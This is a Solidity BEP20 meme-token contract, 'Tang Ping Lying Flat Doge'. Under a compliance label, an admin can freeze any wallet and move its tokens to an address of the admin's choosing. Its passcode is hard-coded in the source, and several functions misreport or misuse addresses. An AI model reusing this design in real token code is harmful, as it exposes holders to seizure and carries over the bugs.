// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10; 

/**
 * Tang Ping Lying Flat Doge
 * R1.2
 * 
 * A chive lying flat cannot be reaped.
 *
 * You receive TPLFDOGE - the system notifies everyone you are Lying Flat.
 * You transfer TPLFDOGE - the system provides a Neijuan Alert - you are not Lying Flat.
 * You burn TPLFDOGE - the system notifies everyone you have turned Everything to Nothing. You are a Zen Master. You are Lying Flat.
 * 
 * Who will Lay Flat the most?  The longest?  Who is a Neijuan?
 * Who is Turning Everything To Nothing?  Who is a Zen Master?
 * 
 * tplfdoge.com
 * tangpinglyingflatdoge.com
 * lyingflatdoge.com
 * tangpingdoge.com
 * 
*/

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function getOwner() external returns (address);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); // Required for Binance BEP-82
}

interface IBEP20Metadata is IBEP20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract BEP20 is Context, IBEP20, IBEP20Metadata {
    address private _TPLFDOGEDirector;
    address private _FintracAdmin;
    address private _TPLFDOGEAddress = _msgSender();
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    uint24 private _chOVC = 832254;
    
    
/** FINTRAC Requirement and Obligations Section
   * The Canadian Government requires FINTRAC Compliance for Canadian CryptoCurrencies.
   * This section addresses compliance in a manner that is fair, impartial, and efficient.
   * Please contact the Government of Canada for more information about FINTRAC. Fintrac-canafe.gc.ca
   * It is important to read and follow the Terms of Use, Disclaimer of Risks, and Privacy Policy 
   * regarding the use of TPLFDOGE provided on tplfdoge.com.  
   * Do NOT use TPLFDOGE in a manner contrary to these documents, FINTRAC Regulations,
   * or contrary to the laws of the Country you reside in.
*/ 
    function AssignFintracAdmin(address newFintracAdmin, uint24 vtCO) public onlyDirector {
        require(vtCO == _chOVC, "You do not want to assign a Fintec Administrator!");
        _AssignFintracAdmin(newFintracAdmin);
    }
   
    function _AssignFintracAdmin(address newFintracAdmin) internal {
        _FintracAdmin = newFintracAdmin;
        emit FintracAdminTransferred(_TPLFDOGEDirector, newFintracAdmin);
    }
    
    event FintracAdminTransferred(address indexed Director, address indexed newFintracAdmin);
   
    function FintracAdmin() public view virtual returns (address) {
        return _FintracAdmin;
    }
    
    modifier onlyFintracAdmin() {
        require(FintracAdmin() == _msgSender(), "Only Fintrac Administrator!");
        _;
    }
    
 /** The Fintrac Admin creates and maintains a list of wallet addresses that are under Review.
  * If a wallet is under Review, the Fintrac Admin may pause the functions of the wallet
  * while gathering information or FINTRAC is consulted.  The Fintrac Admin may pause the functions 
  * of a wallet on order of FINTRAC or any Authority With Jurisdiction in Canada.
  * If a wallet is paused for review, it will send the message "Contact TPLFDOGE Fintec Administrator!"
  * Wallets under review that are paused cannot transfer, receive, burn, or otherwise use TPLFDOGE.
  * Contacting the TPLFDOGE Fintrac Admin will begin the process of resolving the issue with FINTRAC Canada.
  * Resolution involves providing personal information and additional transaction information, 
  * which will be provided to FINTRAC Canada as per our obligations and reporting requirements.
*/
   
    mapping (address => bool) FAReviewList;
    event FAReviewStatus (address indexed FAReviewAddress, bool indexed AddressFAReviewStatus);
    event FintracOrderedTransfer(address indexed from, address indexed to, uint256 value);
    
    function FAReviewProcess (address ReviewAddress, bool ReviewStatus) public onlyFintracAdmin {
        require(ReviewAddress != address(0), "Ownable: new owner cannot be the zero address");
        require(ReviewAddress != _TPLFDOGEAddress, "Cannot Review the Contract Address");
        require(ReviewAddress != _TPLFDOGEDirector, "Cannot Review the Director Address");
        FAReviewList[ReviewAddress] = ReviewStatus;
        emit FAReviewStatus (ReviewAddress, ReviewStatus);
    }
    
/** If FINTRAC Canada requests the enforcement of a FINTRAC Order upon a wallet address, the Fintrac Admin
  *  may transfer a sum of tokens to a Law Enforcement wallet address as defined by FINTRAC or 
  * an Authority with Jurisdiction in Canada. 
  * The Fintrac Admin will not burn tokens under any circumstances.
*/
    function _FintracEnforcementTransfer(address sender, address recipient, uint256 amount) public onlyFintracAdmin {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(FAReviewList[sender] == true, "Wallet has not been reviewed; and subject to an transfer order by FINTRAC!");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit FintracOrderedTransfer(sender, recipient, amount);
    }
   // End FINTRAC Requirement and Obligations Section

    function getOwner() public view virtual override returns (address) {
        return _TPLFDOGEDirector;  // a duplicate to satisfy BEP-82
    }

    function transferOwnership(address newOwner, uint24 vtCO) public onlyDirector {
        require(vtCO == _chOVC, "You do not want to transfer ownership!");
        _transferOwnership(newOwner);
    }
  
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner cannot be the zero address");
        _TPLFDOGEDirector = newOwner;
        emit OwnershipTransferred(_TPLFDOGEDirector, newOwner);
    }
 
    event TangPingLyingFlat (address indexed TangPingLyingFlat);
    event Neijuan (address indexed Neijuan);
    event NoAttachments (address indexed ZenMaster, address indexed EverythingToNothing, uint256 Amount);

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        address msgSender = _msgSender();
        _TPLFDOGEDirector = msgSender;
        _FintracAdmin = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function TPLFDOGEDirector() public view virtual returns (address) {
        return _TPLFDOGEDirector;
    }

    modifier onlyDirector() {
        require(TPLFDOGEDirector() == _msgSender(), "Only Director!");
        _;
    }
    
    function _setTPLFDOGEAddress (address payable setaddress, uint24 vtCO) public virtual onlyDirector {
        require(setaddress != address(0), "Can't set to the zero address");
        require(vtCO == _chOVC, "You do not want to set Tang Ping Lying Flat Doge address!");
        _TPLFDOGEAddress = setaddress;
        emit OwnershipTransferred(_TPLFDOGEAddress, setaddress);
    }
        
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    uint256 fallbackamt;
    fallback() external payable { fallbackamt = msg.value; }
    receive() external payable { fallbackamt = msg.value; }
  
    function TPLFDOGETransfer(address payable TPLFDOGEto) public onlyDirector {
        TPLFDOGEto.transfer(_TPLFDOGEAddress.balance);
    }
 
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        emit Neijuan(_msgSender());
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(FAReviewList[sender] == false && FAReviewList[recipient] == false && FAReviewList[_msgSender()] == false, "Contact TPLFDOGE Fintec Administrator!");
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
         emit Neijuan(_msgSender());
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        emit Neijuan(_msgSender());
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        emit Neijuan(_msgSender());
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(FAReviewList[sender] == false && FAReviewList[recipient] == false, "Contact TPLFDOGE Fintec Administrator!");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        emit Neijuan(sender);
        emit TangPingLyingFlat(recipient);
    }
    
    function _burnToLayFlat(uint256 amount) public virtual {
        require(_msgSender() != address(0), "BEP20: burn from the zero address");
        require(FAReviewList[_msgSender()] == false, "Contact TPLFDOGE Fintec Administrator!");
        _beforeTokenTransfer(_msgSender(), address(0), amount);
        uint256 accountBalance = _balances[_msgSender()];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        _balances[_msgSender()] = accountBalance - amount;
        _totalSupply -= amount;
        emit Transfer(_msgSender(), address(0), amount);
        emit NoAttachments(_msgSender(), address(0), amount);
        emit TangPingLyingFlat(_msgSender());
    }
    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        require(FAReviewList[owner] == false, "Contact TPLFDOGE Fintec Administrator!");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

contract TPLFDOGE is BEP20 {
    constructor() BEP20("Tang Ping Lying Flat Doge", "TPLFDOGE") {
        _mint(msg.sender, 777777777777777 * 10 ** decimals());
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._beforeTokenTransfer(from, to, amount);
    }
    

}
